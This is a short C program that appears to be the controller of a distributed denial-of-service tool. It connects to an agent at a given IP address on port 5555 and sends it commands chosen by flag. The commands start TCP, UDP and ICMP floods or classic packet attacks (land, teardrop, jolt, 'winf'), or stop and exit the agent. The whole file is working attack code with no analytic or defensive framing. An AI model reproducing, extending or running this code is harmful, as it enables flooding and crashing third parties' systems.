#include<sys/types.h>
#include<sys/socket.h>
#include<stdio.h>
#include<sys/un.h>
#include<unistd.h>
#include<netinet/in.h>
#include<arpa/inet.h>
#include<string.h>

int main(int argc,char **argv)
{
	int socket_file;
	int socket_addlen;
	int connection;
	int count = 0;

	char temp1 = '!';
	char data[100] = "";

	struct sockaddr_in socket_property;

	socket_file = socket( AF_INET, SOCK_STREAM, 0);
	
	socket_property.sin_family =  AF_INET;
	socket_property.sin_port =  htons(5555);
	socket_property.sin_addr.s_addr = inet_addr(argv[1]);
	
	if (strcmp(argv[2],"-t") == 0)
	{
		strcat(data,"$tcp$@");
	}
	else if (strcmp(argv[2],"-u") == 0)
	{
		strcat(data,"$udp$@");
	}
	else if (strcmp(argv[2],"-i") == 0)
	{
		strcat(data,"$icmp$@");
	}
	else if (strcmp(argv[2],"-x") == 0)
	{
		strcat(data,"$stop$@");
	}
	else if (strcmp(argv[2],"-q") == 0)
	{
		strcat(data,"$exit$@");
	}
	else if (strcmp(argv[2],"-L") == 0)
	{
		strcat(data,"$land$@");
	}
	else if (strcmp(argv[2],"-T") == 0)
	{
		strcat(data,"$tear$@");
	}
	else if (strcmp(argv[2],"-J") == 0)
	{
		strcat(data,"$jolt$@");
	}
	else if (strcmp(argv[2],"-D") == 0)
	{
		strcat(data,"$dos$@");
	}
	else if (strcmp(argv[2],"-W") == 0)
	{
		strcat(data,"$winf$@");
	}
	else{strcat(data,"$start$NO DATA@");}

	

	socket_addlen =  sizeof(socket_property);

	connection = connect(socket_file, (struct sockaddr *)&socket_property, socket_addlen);

	if(connection == -1)
	{
		perror("oops: client");
		exit(1);
	}

	printf("\n.................connection success !!\n");
	while (temp1 != '@')
	{
		temp1 = data[count];
		write(socket_file, &temp1,1);
		count++;
	
	}
	 close(socket_file);
	 exit(0);
}
